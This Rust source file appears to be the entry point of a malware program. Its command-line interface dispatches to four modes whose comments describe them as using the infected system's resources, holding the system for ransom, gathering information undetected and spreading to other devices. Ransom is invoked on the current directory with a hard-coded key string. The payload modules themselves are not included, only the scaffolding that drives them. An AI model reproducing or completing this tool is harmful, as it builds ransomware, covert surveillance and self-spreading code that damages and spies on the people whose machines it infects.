use clap::{Parser, Subcommand};
use config::{Config, ConfigError, FileFormat};
use env_logger::{fmt::Target, Builder};
use log::{debug, error, info, log_enabled, Level, LevelFilter};
use std::io::Write;

mod borrow;
mod ransom;
mod snoop;
mod spread;

use borrow::borrow;
use ransom::ransom;
use snoop::snoop;
use spread::spread;

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Sets a custom config file
    #[arg(short, long, value_name = "FILE")]
    config: Option<String>,

    /// Set the logging info destination
    #[arg(short, long, value_name = "FILE")]
    output: Option<String>,

    /// Set the current working directory
    #[arg(short, long, value_name = "DIR")]
    pwd: Option<String>,

    /// Turn debugging information on
    #[arg(short, long, action = clap::ArgAction::Count)]
    debug: u8,

    #[command(subcommand)]
    mode: Option<Modes>,
}

#[derive(Subcommand)]
enum Modes {
    Borrow, // Utilize system resources
    Ransom, // Hold the infected system for ransom
    Snoop,  // Gather information without being detected
    Spread, // Spread the running program to other devices
}

fn read_config(path: &str) -> Result<Config, ConfigError> {
    let builder = Config::builder()
        .set_default("default", "1")?
        .add_source(config::File::new(path, FileFormat::Json))
        .set_override("override", "1")?;

    builder.build()
}

fn main() {
    // get user input
    let cli = Cli::parse();

    // set up logging
    let mut builder = Builder::from_default_env();
    builder.format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()));
    if let Some(save_to) = cli.output {
        match std::fs::File::create(save_to) {
            Ok(file) => {
                builder.target(Target::Pipe(Box::new(file)));
            }
            Err(e) => println!("[ERROR]: {:?}", e),
        }
    }

    // set the logging verbosity
    let verbosity = match cli.debug {
        0 => Level::Error,
        1 => Level::Warn,
        2 => Level::Info,
        3 => Level::Debug,
        4 => Level::Trace,
        _ => {
            println!("ignoring additional debug flags");
            Level::Trace
        }
    };
    builder.filter(None, verbosity.to_level_filter()).init();

    // Check if the user provided a config path
    if let Some(config_path) = cli.config.as_deref() {
        debug!("{config_path:?}");
        match read_config(config_path) {
            Ok(msg) => info!("{msg:?}"),
            Err(e) => error!("{e:?}"),
        }
    }

    if let Some(pwd) = cli.pwd {
        match std::env::set_current_dir(pwd) {
            Ok(msg) => info!("{msg:?}"),
            Err(e) => error!("{e:?}"),
        }
    }

    // check if the user specified a mode
    if let Some(mode) = cli.mode {
        match mode {
            Modes::Borrow => borrow(),
            Modes::Ransom => ransom("./", "abcd.efg"),
            Modes::Snoop => snoop(),
            Modes::Spread => spread(),
            // _ => unreachable!(), // panics if code becomes not unreachable
        }
    };

    info!("finished!");
}
